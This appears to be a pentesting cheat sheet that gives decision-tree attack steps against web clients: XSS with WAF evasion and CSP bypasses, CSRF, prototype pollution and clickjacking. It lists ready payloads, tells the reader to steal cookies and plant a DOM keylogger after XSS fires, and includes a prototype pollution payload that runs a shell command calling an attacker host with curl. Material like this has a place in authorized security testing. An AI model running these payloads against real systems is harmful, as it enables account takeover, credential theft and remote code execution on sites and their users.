## Client-Side Attacks (XSS, CSRF, Prototype Pollution, Clickjacking)

### XSS (Reflected / Stored / DOM)

- `->` **[Primary Probe]** Inject `dalfox url "https://target/search?q=FUZZ" --cookie "session=X" --blind https://<interactsh>` across all reflection points [aress](https://www.aress.com/blog/read/20-best-web-application-penetration-testing-tools-in-2025)
  - `->` **[Signal: Payload fires in browser]** → Escalate to account takeover: exfiltrate cookies, forge authenticated requests, install persistent keylogger in DOM
  - `->` **[Dead End: HTML entities encoded]** → Test DOM-based XSS: grep JS source for sinks: `document.write`, `innerHTML`, `eval`, `location.href`; trace sources: `location.hash`, `document.referrer`, `postMessage`
  - `->` **[Dead End: CSP blocks inline execution]** → CSP bypass via JSONP endpoint: `<script src="/api/callback?cb=alert(1)">`, or use trusted CDN whitelisted in CSP (`angular.min.js` for `ng-app` injection)
  - `->` **[Dead End: Strict CSP with nonce]** → XSS via file upload (SVG): `<svg onload="alert(document.domain)"/>` served from same origin

**WAF Evasion Patterns:**
- Tag obfuscation: `<ScRiPt>`, `<img/src=x onerror=alert(1)>`
- JS comment injection: `</script><script>ale/**/rt(1)</script>`
- String concatenation: `'ale'+'rt'+'(1)'`
- Template literals: `` alert`1` ``
- HTML5 vectors: `<details open ontoggle=alert(1)>`

### CSRF

- `->` **[Primary Probe]** Remove `CSRF token` parameter from state-changing requests; replay in cross-origin context (use Burp CSRF PoC generator); observe if action executes [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/)
  - `->` **[Signal: Action succeeds without token]** → Build PoC HTML form with `target="_blank"` for stealth delivery
  - `->` **[Dead End: Token validated]** → Test token-reuse: capture one valid token, use it twice; test same-site=Lax bypass via GET method state change; test token tied to session but not to action
  - `->` **[Dead End: SameSite=Strict cookies]** → CSRF via XSS: chain a stored XSS to extract and replay CSRF token programmatically

### Prototype Pollution

- `->` **[Primary Probe]** Use Burp DOM Invader with prototype pollution canary injection; also run `ppmap -u "https://target"` for automated gadget discovery [xploitcore.hashnode](https://xploitcore.hashnode.dev/bug-bounty-guide-2025)
  - `->` **[Signal: `__proto__[canary]=1` reflected or `Object.prototype.canary` truthy]** → Search for exploitable gadgets: `innerHTML`, `eval`, `fetch`, `document.write` consuming polluted properties
  - `->` **[Dead End: Client-side hardened]** → Test server-side prototype pollution in Node.js: send `{"__proto__":{"admin":true}}` in JSON body; or `constructor[prototype][admin]=true` in query params
  - `->` **[Dead End: No client gadgets found]** → Pollution via URL query string: `?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').exec('curl attacker')//`

### Clickjacking

- `->` **[Primary Probe]** Check `X-Frame-Options` and `Content-Security-Policy: frame-ancestors` headers; attempt to iframe target in a test HTML page
  - `->` **[Signal: Page frames successfully]** → Build UI overlay PoC targeting high-impact action (fund transfer, delete account)
  - `->` **[Dead End: `DENY` or `SAMEORIGIN` set]** → Test for partial-page framing via `object` or `embed` tags; check subdomains with looser frame policies

***

